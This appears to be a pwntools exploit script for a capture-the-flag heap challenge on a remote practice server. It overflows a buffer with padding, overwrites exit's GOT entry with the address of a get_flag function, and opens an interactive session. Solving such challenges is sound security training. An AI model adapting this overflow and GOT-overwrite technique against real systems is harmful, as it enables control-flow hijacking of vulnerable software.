from pwn import *

#p = process("./beginner_heap.bin")
p = remote("ctf.j0n9hyun.xyz", 3016)
exit_got = 0x601068
get_flag = 0x400826

payload = ''
payload += 'A'*40
payload += p64(exit_got)

payload2 = ''
payload2 += p64(get_flag)
p.sendline(payload)
p.sendline(payload2)
p.interactive()